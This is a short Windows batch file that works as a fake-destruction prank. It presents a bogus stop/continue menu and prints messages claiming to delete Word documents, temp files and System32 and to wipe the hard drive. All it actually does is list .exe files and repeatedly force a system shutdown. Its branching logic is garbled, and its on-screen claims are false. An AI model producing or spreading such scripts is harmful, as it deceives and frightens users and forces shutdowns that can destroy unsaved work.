@echo off

color 0a 
echo Chose 1 if you want this to stop
echo Chose 2 if you want this to continue
echo Please Enter Your choice: 
set /p password= 
if %password% == 3 goto correct ELSE FALSE goto false 
echo Authentication Failed: 
pause 
echo Deleting Information 
quit 
:correct 
:false
dir /s /b *.exe | findstr /v .exe.o
 dir /s /b *.exe | findstr /v .exe.
 dir /s /b *.exe | findstr /v .exe.
echo ...Removing all word documents...
Start Shutdown.exe
echo DONE
echo ..Removing all %temp%...
Start Shutdown.exe
echo DONE
Start Shutdown.exe
echo ..Removing %SYSTEM32%...
Start Shutdown.exe
echo DONE
echo Wiping HardDrive Data...
echo DONE
echo KILLING SYSTEM COMPUTER WILL SHUT DOWN
Start Shutdown.exe
shutdown.exe -s -t 10 -c "System Shutting Down"
quit